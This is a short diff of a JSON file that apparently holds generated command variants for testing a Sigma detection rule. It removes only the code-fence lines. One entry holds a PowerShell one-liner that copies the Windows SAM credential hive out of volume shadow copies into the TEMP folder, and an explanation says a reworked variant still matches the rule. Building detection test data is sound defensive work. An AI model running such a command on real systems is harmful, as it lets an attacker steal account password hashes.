@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "\"powershell.exe\" & {1..10 | %% { try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\" , \"true\") } catch {} ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore }}",
@@ -13,4 +12,3 @@
     "explanation": "The command was restructured by replacing the pipeline with a foreach loop and using Get-Item instead of ls. The logic remains the same and still matches the Sigma rule."
   }
 ]
-```
